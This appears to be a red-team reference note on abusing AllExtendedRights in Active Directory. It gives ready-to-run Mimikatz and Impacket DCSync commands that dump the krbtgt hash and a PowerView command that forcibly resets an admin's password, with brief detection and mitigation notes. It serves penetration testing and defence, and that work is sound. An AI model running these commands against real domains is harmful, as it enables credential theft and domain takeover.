---
title: "Attack #24 — AllExtendedRights DCSync ACE Abuse"
description: "AllExtendedRights is a blanket permission that grants every extended right on an AD object. When applied to the domain root object, this includes the two…"
category: active-directory
tags: ["active-directory", "credential-access", "delegation"]
tools: ["Impacket", "Mimikatz", "BloodHound", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Three/🟡 Attack #24 — AllExtendedRights DCSync ACE Abuse.md"
---
# 🟡 Attack #24 — AllExtendedRights / DCSync ACE Abuse

***

## 📖 How It Works

`AllExtendedRights` is a blanket permission that grants **every extended right** on an AD object. When applied to the **domain root object**, this includes the two critical replication rights: `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` — which is everything needed for DCSync. Unlike WriteDACL (where you ADD new ACEs), AllExtendedRights means you **already have** the DCSync permission implicitly — you can immediately run DCSync without any DACL modification.

This permission is also dangerous on user objects, where it grants `User-Force-Change-Password` (password reset) and `User-Change-Password` among other extended rights.

### AllExtendedRights Impact by Target

| Target | Extended Rights Granted | Impact |
|---|---|---|
| **Domain root object** | DS-Replication-Get-Changes + All | Immediate DCSync capability |
| **User object** | User-Force-Change-Password | Password reset without knowing current password |
| **Computer object** | Various | Read LAPS password, modify delegation |
| **Any object** | All extended rights for that object class | Full extended right access |

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **AllExtendedRights on domain root** | For DCSync — check via BloodHound or PowerView |
| **Domain user account** | The principal with AllExtendedRights |

***

## 💻 Full Commands

### 🔵 Enumerate AllExtendedRights

```powershell
# ── Find who has AllExtendedRights on the domain root ─────────────────────────
Get-ObjectAcl "DC=corp,DC=local" -ResolveGUIDs | 
  Where-Object { $_.ActiveDirectoryRights -match "ExtendedRight" -and 
    $_.ObjectAceType -eq "00000000-0000-0000-0000-000000000000" } |
  ForEach-Object { 
    $_ | Add-Member -NotePropertyName Principal -NotePropertyValue (
      Convert-SidToName $_.SecurityIdentifier
    ) -PassThru
  } | Select-Object Principal, ActiveDirectoryRights
# ObjectAceType of all zeros = AllExtendedRights
```

### 🔴 Immediate DCSync (No ACL Modification Needed)

```powershell
# ── If you have AllExtendedRights on domain root, just DCSync ─────────────────
mimikatz.exe "lsadump::dcsync /domain:corp.local /user:krbtgt" exit
```

```bash
# ── Linux ─────────────────────────────────────────────────────────────────────
secretsdump.py corp.local/low_user:'Password1'@DC01.corp.local -just-dc-user krbtgt
# This works directly because AllExtendedRights = has replication rights
```

### 🔴 AllExtendedRights on User → Password Reset

```powershell
Set-DomainUserPassword -Identity targetadmin -AccountPassword (
  ConvertTo-SecureString 'P@ssword123!' -AsPlainText -Force
)
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4662** | Security Log (DC) | Replication rights used — same as DCSync detection |
| **4724** | Security Log (DC) | Password reset (if used on user objects) |

***

## 🔗 Attack Chain Context

```
[AllExtendedRights] ──→ Immediate DCSync or Password Reset
         │
         ├──→ 🩸 On domain root → DCSync without any ACL modification
         ├──→ 🔑 On user → password reset
         ├──→ 🔗 Differs from WriteDACL: no need to ADD rights, you already HAVE them
         └──→ 💀 Defeated by: audit who has AllExtendedRights, limit to legitimate accounts
```

***

> ✅ **Attack #24 — AllExtendedRights Abuse complete.**
